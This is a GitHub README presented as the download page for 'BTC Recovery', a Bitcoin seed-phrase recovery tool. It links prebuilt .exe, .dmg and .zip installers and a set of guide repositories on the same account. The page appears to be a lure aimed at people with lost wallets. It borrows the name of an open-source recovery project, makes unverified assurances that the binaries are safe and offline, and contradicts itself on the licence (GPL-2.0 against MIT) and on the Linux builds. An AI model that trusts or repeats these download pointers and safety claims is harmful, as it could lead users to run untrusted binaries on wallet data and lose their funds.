<div align="center">
<img src="assets/banner-profile.png" alt="BTC Recovery downloads">
</div>

<h1 align="center">BTC Recovery downloads</h1>

<p align="center">One place for the current release and the three installers.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Each installer is published on the release page, with its own checksum beside it.

> Only download from this GitHub release page.

## What this repository is for

This repository is the download entry point for BTC Recovery. It exists so that a reader who already knows what they want does not have to read a guide to find it: the current release, the three installers, the checksums and the install steps are all on this page, and every link stays inside this account. The application itself is published from the application repository, and that is where the release notes live. What this page adds is orientation for someone arriving from a search engine with a wallet problem and no idea which of the repositories holds the answer. If you have a phrase, a file or a password, the guide repositories cover each in turn, and the profile page is the index to all of them.

## Who it is for

- You know you need the installer and want the current one without reading a handbook first.
- You are checking which platforms are published before you commit to a method.
- You arrived from a search result and need to find the guide for your situation.

## Start here

- The download table above names the three installers for the current release.
- Verify the file against the checksum published with the release before you run it.
- Read the first-run walkthrough in the tool guides repository before pointing it at a wallet.

## How to use these guides

1. Pick the installer for your platform from the table.
2. Compare its SHA-256 with the published value on the machine you will use.
3. Install, then read the guide that matches what you are holding.

## The guides, grouped

Four pages cover the questions this download page raises.

| Guide | What it answers |
| --- | --- |
| [Bitcoin wallet recovery tool: what it does and when it works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-bitcoin-wallet-recovery-tool.md) | It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere. |
| [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md) | The options exist to pin those down, and the built-in help lists every flag with its current spelling. |
| [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |
| [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) | A seed phrase can be recovered when part of it still exists. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A recovery that needs a plan | The seed phrase guides | A search small enough to run, checked against one address. |
| A wallet file with no password | The wallet file guides | Candidates tested against a copy of the file, offline. |
| A download you want to check | The tool guides | The published checksum and the file that matches it. |

## Common first questions

### Where are the release notes?

On the release page itself, which the download table links to. This page repeats the download details and nothing else.

### Which file do I need on Linux?

The archive carries both the x86-64 and the ARM64 build, so take the one that matches your machine.

### Do I have to install anything else?

No. The installer carries everything it needs, and the guides assume nothing beyond the release itself.

## Before you install

Verify the installer against the checksum published with the release before you run it, and keep the wallet you are working on backed up somewhere separate from the machine that runs the search. Nothing on this page asks for an account, a payment or a phrase, and no step here involves sending a wallet anywhere. If a search result offers a hosted recovery service, that is a different product and a different risk, and it is not what this page publishes.

## About

This repository is one of five pages on the account that describe BTC Recovery. The application repository publishes the release and its notes, three guide repositories cover the phrase, the wallet file and the tool itself, and the profile page indexes all of them. Keeping the download entry point separate from the guides means a reader who already knows what they need never has to read a handbook to find the installer.

## License

The pages here are published under the MIT licence, and [LICENSE](LICENSE) carries the full text.

---

**BTC Recovery downloads** - one page of the BTC Recovery account.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
